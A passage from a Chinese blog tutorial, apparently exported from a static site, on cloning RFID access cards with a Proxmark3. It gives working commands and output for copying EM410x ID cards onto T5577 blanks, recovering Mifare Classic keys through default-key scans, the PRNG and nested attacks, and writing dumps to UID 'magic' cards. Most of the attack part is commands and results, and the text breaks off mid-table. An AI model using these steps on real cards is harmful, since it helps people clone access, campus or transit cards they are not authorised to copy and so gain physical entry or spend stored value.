EML.bat`脚本转成eml格式\n![10](/img/2018-07-26/10.png)\n写入到白卡（UID卡）上\n```\nproxmark3> hf mf cload  dumpdata\nLoaded from file: dumpdata.eml\n```\n写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了\n**IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去**","slug":"proxmark3","published":1,"mouth":"07","updated":"2020-09-18T03:25:13.595Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhowy0009ez8kf4emt20g","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。<strong>真正有问题的不是安全，而是人心。</strong>很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。<br><a id=\"more\"></a></p>\n<h4 id=\"硬件准备\"><a href=\"#硬件准备\" class=\"headerlink\" title=\"硬件准备\"></a>硬件准备</h4><h5 id=\"破解设备\"><a href=\"#破解设备\" class=\"headerlink\" title=\"破解设备\"></a>破解设备</h5><p>Proxmark3 Easy<br><img src=\"/img/2018-07-26/Proxmark3.jpg\" srcset=\"/img/static/loading.gif\" alt=\"Proxmark3 Easy\"><br>破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足<br><img src=\"/img/2018-07-26/arc122u.jpg\" srcset=\"/img/static/loading.gif\" alt=\"arc122u\"></p>\n<h5 id=\"各种卡\"><a href=\"#各种卡\" class=\"headerlink\" title=\"各种卡\"></a>各种卡</h5><p>准备一些ID，IC卡<br><img src=\"/img/2018-07-26/ka.jpg\" srcset=\"/img/static/loading.gif\" alt=\"ka\"><br>这不都长一个样么（＃－.－）</p>\n<h5 id=\"区分ID卡和IC卡的方法\"><a href=\"#区分ID卡和IC卡的方法\" class=\"headerlink\" title=\"区分ID卡和IC卡的方法\"></a>区分ID卡和IC卡的方法</h5><ol>\n<li>光照法<br><img src=\"/img/2018-07-26/1.jpg\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><img src=\"/img/2018-07-26/2.jpg\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>圆形大多是ID卡，方形大多是IC卡</li>\n<li>NFC法<br>拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡</li>\n</ol>\n<h4 id=\"知识准备\"><a href=\"#知识准备\" class=\"headerlink\" title=\"知识准备\"></a>知识准备</h4><p>&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里–&gt;<a href=\"https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&amp;fromid=497249\" target=\"_blank\" rel=\"noopener\">传送门</a>，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有</p>\n<style>\ntable th:first-of-type {  \n    width: 25%; \n}\ntable th:nth-of-type(2) {  \n    width: 7%; \n}\ntable th:nth-of-type(3) {  \n    width: 68%; \n}\n</style>\n\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th style=\"text-align:center\">频率</th>\n<th>特性</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Mifare S50(简称M1)</td>\n<td style=\"text-align:center\">高频</td>\n<td>最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡</td>\n</tr>\n<tr>\n<td>Mifare UltraLight（简称M0）</td>\n<td style=\"text-align:center\">高频</td>\n<td>低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡</td>\n</tr>\n<tr>\n<td>Mifare UID（简称UID卡）</td>\n<td style=\"text-align:center\">高频</td>\n<td>M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据</td>\n</tr>\n<tr>\n<td>EM4XX（简称ID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）</td>\n</tr>\n<tr>\n<td>T5577（简称可修改ID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码</td>\n</tr>\n<tr>\n<td>HID ProxⅡ（简称HID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>美国常用的低频卡，可擦写，不与其他卡通用</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"高频\"><a href=\"#高频\" class=\"headerlink\" title=\"高频\"></a>高频</h5><h6 id=\"M1-S50卡\"><a href=\"#M1-S50卡\" class=\"headerlink\" title=\"M1 S50卡\"></a>M1 S50卡</h6><p>&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。<strong>每个扇区都有独立的一组密码及访问控制</strong>，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B<br>每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。<br><pre><code class=\"hljs undefined\">扇区<span class=\"hljs-number\">0</span>\t<span class=\"hljs-number\">03332801198804008500</span>b42ef0bb6aa8 块<span class=\"hljs-number\">0</span>\t \t<span class=\"hljs-comment\">//厂商代码，不可更改</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">1</span>\t \t<span class=\"hljs-comment\">//数据块</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">2</span> \t\t<span class=\"hljs-comment\">//数据块</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">3</span> \t\t<span class=\"hljs-comment\">//密码A（6字节），存储控制（4字节），密码B（6字节）</span>\n\n扇区<span class=\"hljs-number\">1</span>\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">4</span> \t\t<span class=\"hljs-comment\">//出了第0扇区稍有不同，其他15个扇区结构完全一样</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">5</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">6</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">7</span>\n\t\t        .\n\t\t        .\n\t\t        .   \n扇区<span class=\"hljs-number\">15</span>\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">60</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">61</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">62</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">63</span></code></pre></p>\n<p>&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。<strong>密码不一定可以读取，由控制字决定。</strong></p>\n<h6 id=\"M1-UID卡\"><a href=\"#M1-UID卡\" class=\"headerlink\" title=\"M1 UID卡\"></a>M1 UID卡</h6><p>&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。</p>\n<h6 id=\"FUID卡\"><a href=\"#FUID卡\" class=\"headerlink\" title=\"FUID卡\"></a>FUID卡</h6><p>&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。<strong>FUID可以修改0块，但只可以修改一次</strong>，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p>\n<h6 id=\"CUID卡\"><a href=\"#CUID卡\" class=\"headerlink\" title=\"CUID卡\"></a>CUID卡</h6><p>&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过<strong>指令</strong>修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p>\n<h5 id=\"低频\"><a href=\"#低频\" class=\"headerlink\" title=\"低频\"></a>低频</h5><h6 id=\"ID卡\"><a href=\"#ID卡\" class=\"headerlink\" title=\"ID卡\"></a>ID卡</h6><p>&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。</p>\n<h6 id=\"T5577卡\"><a href=\"#T5577卡\" class=\"headerlink\" title=\"T5577卡\"></a>T5577卡</h6><p>&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">0x00148040</span>  <span class=\"hljs-number\">00000000000101001000000001000000</span> [<span class=\"hljs-number\">0</span>]\n<span class=\"hljs-number\">0xFF94C004</span>  <span class=\"hljs-number\">11111111100101001100000000000100</span> [<span class=\"hljs-number\">1</span>]\n<span class=\"hljs-number\">0xA5464942</span>  <span class=\"hljs-number\">10100101010001100100100101000010</span> [<span class=\"hljs-number\">2</span>]\n<span class=\"hljs-number\">0xFFFFF808</span>  <span class=\"hljs-number\">11111111111111111111100000001000</span> [<span class=\"hljs-number\">3</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">4</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">5</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">6</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">7</span>]</code></pre></p>\n<h4 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h4><h5 id=\"破解ID卡\"><a href=\"#破解ID卡\" class=\"headerlink\" title=\"破解ID卡\"></a>破解ID卡</h5><h6 id=\"安装驱动\"><a href=\"#安装驱动\" class=\"headerlink\" title=\"安装驱动\"></a>安装驱动</h6><p>驱动下载官网网址–&gt;<a href=\"https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10\" target=\"_blank\" rel=\"noopener\">传送门</a><br>安装驱动文件前需要禁用<strong>驱动安装强制签名</strong>，方法–&gt;<a href=\"https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br>驱动安装方法<br><strong>我的电脑右键–&gt;管理–&gt;设备管理器–&gt;端口下的设备右键–&gt;更新驱动程序–&gt;浏览我的计算机–&gt;选择本地–&gt;从磁盘安装–找到官方的驱动文件–&gt;确认</strong><br>驱动安装完成会显示图片上的样子，记住<strong>COM端口</strong><br><img src=\"/img/2018-07-26/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h6 id=\"硬件使用方法\"><a href=\"#硬件使用方法\" class=\"headerlink\" title=\"硬件使用方法\"></a>硬件使用方法</h6><p><strong>Proxmark3 Easy</strong><br><img src=\"/img/2018-07-26/3.jpg\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<pre><code>1 功能按钮\n2 ABCD工作状态指示灯\n3 USB接口\n4 电源指示灯\n5 低频读卡区\n6 高频读卡区\n</code></pre><p>&emsp;&emsp;功能按钮有<code>退出</code>、<code>取消</code>、<code>停止</code>、<code>强刷固件</code>的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。</p>\n<h6 id=\"破解方法\"><a href=\"#破解方法\" class=\"headerlink\" title=\"破解方法\"></a>破解方法</h6><p><strong>读卡片ID号→换上T5577卡→把ID号写入卡片→完成</strong><br>ID是没有密码只有卡号的，因此只要知道卡号就可以复制。<br>软件资料包–&gt;<a href=\"https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w\" target=\"_blank\" rel=\"noopener\">密码: f8q4</a><br>打开<code>官方软件固件\\pm3-bin-2.5.0\\win32(client+GUI)\\Proxmark Tool.exe</code>，箭头所指选择刚刚驱动安装的那个<code>COM端口</code>，连接Proxmark3，接入电脑后，电源指示灯处<code>POW</code>亮蓝灯，<code>FULL</code>亮绿灯，<code>CHR</code>闪烁微弱红灯。<br><img src=\"/img/2018-07-26/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>在<code>COMMAND TO SEND</code>里输入<code>hw tune</code>测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> hw tune</span>\nMeasuring antenna characteristics, please wait........          \n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF antenna: 22.27 V @   125.00 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF antenna: 31.76 V @   134.00 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF optimal: 31.76 V @   133.33 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> HF antenna: 20.17 V @    13.56 MHz          </span>\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</code></pre></p>\n<p>把低频ID卡（门禁卡）放到低频读卡区输入<code>lf search</code>获取ID卡的信息，把卡号抄下来，复制时要用<br><pre><code class=\"hljs undefined\">proxmark3&gt; lf search\nReading <span class=\"hljs-number\">30000</span> bytes from device memory\nData fetched          \nSamples @ <span class=\"hljs-number\">8</span> bits/smpl, decimation <span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>           \nNOTE: <span class=\"hljs-keyword\">some</span> demods output possible binary\n  <span class=\"hljs-keyword\">if</span> it finds something that looks like a tag          \n<span class=\"hljs-literal\">False</span> Positives ARE possible\nChecking <span class=\"hljs-keyword\">for</span> known tags:\nEM410x pattern found:           \nEM TAG ID      : 0000001450         //<span class=\"hljs-type\">ID</span>卡号，这个抄下来，如果是HID卡会显示HID\nUnique TAG ID  : 000000280<span class=\"hljs-type\">A</span>          \nPossible de-scramble patterns          \nHoneyWell IdentKey &#123;          \nDEZ <span class=\"hljs-number\">8</span>          : 00005200          \nDEZ <span class=\"hljs-number\">10</span>         : 0000005200          \nDEZ <span class=\"hljs-number\">5.5</span>        : 00000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>A       : 000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>B       : 000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>C       : 000.05200          \nDEZ <span class=\"hljs-number\">14</span>/IK2     : 00000000005200          \nDEZ <span class=\"hljs-number\">15</span>/IK3     : 000000000010250          \nDEZ <span class=\"hljs-number\">20</span>/ZK      : 00000000000002080010          \n&#125;\nOther          : 05200_000_00005200          \nPattern Paxton : 1331792 [0<span class=\"hljs-type\">x145250</span>]          \nPattern <span class=\"hljs-number\">1</span>      : 16652 [0<span class=\"hljs-type\">x410C</span>]          \nPattern Sebury : 5200 0 5200  [0<span class=\"hljs-type\">x1450</span> <span class=\"hljs-number\">0</span>x0 <span class=\"hljs-number\">0</span>x1450]          \nValid EM410x ID Found! \t\t\t//卡的类型</code></pre></p>\n<p>把T5577卡放到低频读卡区，输入命令<code>lf hid clone 0000001450</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> lf hid <span class=\"hljs-built_in\">clone</span> 0000001450 </span>\nCloning tag with ID 000001450          \n<span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> </span>\n<span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> <span class=\"hljs-comment\">#db# DONE!</span></span></code></pre></p>\n<p>上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍<br><img src=\"/img/2018-07-26/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>ID卡复制就完成了<br>效果如下<br><img src=\"/img/2018-07-26/11.jpg\" srcset=\"/img/static/loading.gif\" alt=\"11\"></p>\n<h5 id=\"破解IC卡\"><a href=\"#破解IC卡\" class=\"headerlink\" title=\"破解IC卡\"></a>破解IC卡</h5><h6 id=\"IC卡破解思路\"><a href=\"#IC卡破解思路\" class=\"headerlink\" title=\"IC卡破解思路\"></a>IC卡破解思路</h6><p><strong>获取任意扇区的密钥</strong></p>\n<ul>\n<li><strong>PRNG 漏洞攻击得 0 扇区密匙</strong></li>\n<li><strong>默认密码扫描获得密匙</strong></li>\n<li><strong>嗅探读卡机和卡片交互数据获得密匙</strong></li>\n<li><strong>模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）</strong></li>\n</ul>\n<p>↓<br><strong>利用MFOC漏洞用已知扇区密钥求所有扇区密钥</strong><br>↓<br><strong>用破解出的密匙把卡片数据读出导入电脑</strong><br>↓<br><strong>把电脑中的数据写入UID卡中</strong><br>&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。<br>&emsp;&emsp;上面的<code>Proxmark Tool</code>是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态<code>PM3指令台</code>就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。<code>can&#39;t slect card</code>这个bug也是在用了原生态之后才知道的。<br><strong>PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can’t slect card</strong><br><img src=\"/img/2018-07-26/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"></p>\n<h6 id=\"获取0扇区密钥\"><a href=\"#获取0扇区密钥\" class=\"headerlink\" title=\"获取0扇区密钥\"></a>获取0扇区密钥</h6><p>扯远了，默认密码扫描<code>hf mf chk *1 ? t</code><br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf chk <span class=\"hljs-number\">*1</span> ? t\n<span class=\"hljs-literal\">No</span> key specified, trying<span class=\"hljs-built_in\"> default </span>keys\nchk<span class=\"hljs-built_in\"> default </span>key[ 0] ffffffffffff\nchk<span class=\"hljs-built_in\"> default </span>key[ 1] 000000000000\nchk<span class=\"hljs-built_in\"> default </span>key[ 2] a0a1a2a3a4a5\nchk<span class=\"hljs-built_in\"> default </span>key[ 3] b0b1b2b3b4b5\nchk<span class=\"hljs-built_in\"> default </span>key[ 4] aabbccddeeff\nchk<span class=\"hljs-built_in\"> default </span>key[ 5] 4d3a99c351dd\nchk<span class=\"hljs-built_in\"> default </span>key[ 6] 1a982c7e459a\nchk<span class=\"hljs-built_in\"> default </span>key[ 7] d3f7d3f7d3f7\nchk<span class=\"hljs-built_in\"> default </span>key[ 8] 714c5c886e97\nchk<span class=\"hljs-built_in\"> default </span>key[ 9] 587ee5f9350f\nchk<span class=\"hljs-built_in\"> default </span>key[10] a0478cc39091\nchk<span class=\"hljs-built_in\"> default </span>key[11] 533cb6c723f6\nchk<span class=\"hljs-built_in\"> default </span>key[12] 8fd0a4f256e9\n--sector: 0, block:  3, key type:A, key count:13\n\t\t.\n\t\t.\n\t\t.\n--sector:15, block: 63, key type:B, key count:13\nFound valid key:[ffffffffffff]\nFound keys have been transferred <span class=\"hljs-keyword\">to</span> the emulator memory</code></pre></p>\n<p>密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥<code>hf mf mifare</code><br><pre><code class=\"hljs undefined\">proxmark3&gt;hf mf mifare\n\t\t.\n\t\t.\n\t\t.\nuid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)\n\n\n|<span class=\"hljs-string\">diff</span>|<span class=\"hljs-string\">&#123;nr&#125;    </span>|<span class=\"hljs-string\">ks3</span>|<span class=\"hljs-string\">ks3^5</span>|<span class=\"hljs-string\">parity         </span>|\n+----+--------+---+-----+---------------+\n|<span class=\"hljs-string\"> 00 </span>|<span class=\"hljs-string\">00000005</span>|<span class=\"hljs-string\"> 3 </span>|<span class=\"hljs-string\">  6  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 20 </span>|<span class=\"hljs-string\">00000025</span>|<span class=\"hljs-string\"> 7 </span>|<span class=\"hljs-string\">  2  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 40 </span>|<span class=\"hljs-string\">00000045</span>|<span class=\"hljs-string\"> 2 </span>|<span class=\"hljs-string\">  7  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 60 </span>|<span class=\"hljs-string\">00000065</span>|<span class=\"hljs-string\"> 0 </span>|<span class=\"hljs-string\">  5  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 80 </span>|<span class=\"hljs-string\">00000085</span>|<span class=\"hljs-string\"> a </span>|<span class=\"hljs-string\">  f  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> a0 </span>|<span class=\"hljs-string\">000000a5</span>|<span class=\"hljs-string\"> 3 </span>|<span class=\"hljs-string\">  6  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> c0 </span>|<span class=\"hljs-string\">000000c5</span>|<span class=\"hljs-string\"> 2 </span>|<span class=\"hljs-string\">  7  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> e0 </span>|<span class=\"hljs-string\">000000e5</span>|<span class=\"hljs-string\"> 9 </span>|<span class=\"hljs-string\">  c  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\nparity is all zero,try special attack!just wait for few more seconds...         \np1:0 p2:0 p3:0 key:ffffffffffff\np1:58b87 p2:61ec p3:1 key:b4c98bd73e94\np1:c6a1b p2:d983 p3:2 key:576efc88ccc7\np1:ef844 p2:106dd p3:3 key:34ed3c6092e9\np1:f7e1e p2:10fd7 p3:4 key:2de06659d60e\np1:1239c0 p2:13fa0 p3:5 key:08b7558601a1\np1:12d1b3 p2:149c9 p3:6 key:00adbba1e330\nkey_count:7\n------------------------------------------------------------------\nKey found:ffffffffffff\n\nFound valid key:ffffffffffff</code></pre></p>\n<p>因为设备是<del>我</del>小姐姐的，固件是630之后的，所以会出现很多<code>#db# Mifare: Can&#39;t select card</code>,就放不了全部代码，查看固件命令<code>hw version</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">proxmark3</span>&gt; <span class=\"hljs-selector-tag\">hw</span> <span class=\"hljs-selector-tag\">version</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">Prox</span>/<span class=\"hljs-selector-tag\">RFID</span> <span class=\"hljs-selector-tag\">mark3</span> <span class=\"hljs-selector-tag\">RFID</span> <span class=\"hljs-selector-tag\">instrument</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">bootrom</span>: /<span class=\"hljs-selector-tag\">-suspect</span> <span class=\"hljs-selector-tag\">2016-11-09</span> <span class=\"hljs-selector-tag\">00</span><span class=\"hljs-selector-pseudo\">:59</span><span class=\"hljs-selector-pseudo\">:56</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">os</span>: /<span class=\"hljs-selector-tag\">-suspect</span> <span class=\"hljs-selector-tag\">2016-12-08</span> <span class=\"hljs-selector-tag\">12</span><span class=\"hljs-selector-pseudo\">:45</span><span class=\"hljs-selector-pseudo\">:38</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">HF</span> <span class=\"hljs-selector-tag\">FPGA</span> <span class=\"hljs-selector-tag\">image</span> <span class=\"hljs-selector-tag\">built</span> <span class=\"hljs-selector-tag\">on</span> <span class=\"hljs-selector-tag\">2015</span>/<span class=\"hljs-selector-tag\">03</span>/<span class=\"hljs-selector-tag\">09</span> <span class=\"hljs-selector-tag\">at</span> <span class=\"hljs-selector-tag\">08</span><span class=\"hljs-selector-pseudo\">:41</span><span class=\"hljs-selector-pseudo\">:42</span>\n<span class=\"hljs-selector-id\">#db</span>#   <span class=\"hljs-selector-tag\">Modify</span> <span class=\"hljs-selector-tag\">by</span> <span class=\"hljs-selector-tag\">Willok</span>(willok<span class=\"hljs-variable\">@163</span>.com)\n\n<span class=\"hljs-selector-id\">#db</span>#      <span class=\"hljs-selector-tag\">proxmark3</span><span class=\"hljs-selector-class\">.taobao</span><span class=\"hljs-selector-class\">.com</span>\n\n\n<span class=\"hljs-selector-tag\">uC</span>: <span class=\"hljs-selector-tag\">AT91SAM7S256</span> <span class=\"hljs-selector-tag\">Rev</span> <span class=\"hljs-selector-tag\">B</span>\n<span class=\"hljs-selector-tag\">Embedded</span> <span class=\"hljs-selector-tag\">Processor</span>: <span class=\"hljs-selector-tag\">ARM7TDMI</span>\n<span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">256K</span> <span class=\"hljs-selector-tag\">bytes</span>\n<span class=\"hljs-selector-tag\">Second</span> <span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">None</span>\n<span class=\"hljs-selector-tag\">Internal</span> <span class=\"hljs-selector-tag\">SRAM</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">64K</span> <span class=\"hljs-selector-tag\">bytes</span>\n<span class=\"hljs-selector-tag\">Architecture</span> <span class=\"hljs-selector-tag\">Identifier</span>: <span class=\"hljs-selector-tag\">AT91SAM7Sxx</span> <span class=\"hljs-selector-tag\">Series</span>\n<span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Type</span>: <span class=\"hljs-selector-tag\">Embedded</span> <span class=\"hljs-selector-tag\">Flash</span> <span class=\"hljs-selector-tag\">Memory</span></code></pre></p>\n<p><strong>Tip:固件版本是根据固件的日期来看的</strong><br>我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf chk <span class=\"hljs-number\">0</span> A ffffffffffff\nchk <span class=\"hljs-built_in\">key</span>[ <span class=\"hljs-number\">0</span>] ffffffffffff\n--sector: <span class=\"hljs-number\">0</span>, block:  <span class=\"hljs-number\">0</span>, <span class=\"hljs-built_in\">key</span> <span class=\"hljs-built_in\">type</span>:A, <span class=\"hljs-built_in\">key</span> <span class=\"hljs-built_in\">count</span>: <span class=\"hljs-number\">1</span>\nFound valid <span class=\"hljs-built_in\">key</span>:[ffffffffffff]</code></pre></p>\n<h6 id=\"知一求十五\"><a href=\"#知一求十五\" class=\"headerlink\" title=\"知一求十五\"></a>知一求十五</h6><p>获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf nested 1 0 A ffffffffffff \t\t\t//0是0扇区，A密钥\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.330 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">sec</span>|<span class=\"hljs-string\">key A           </span>|<span class=\"hljs-string\">res</span>|<span class=\"hljs-string\">key B           </span>|<span class=\"hljs-string\">res</span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">000</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">001</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span 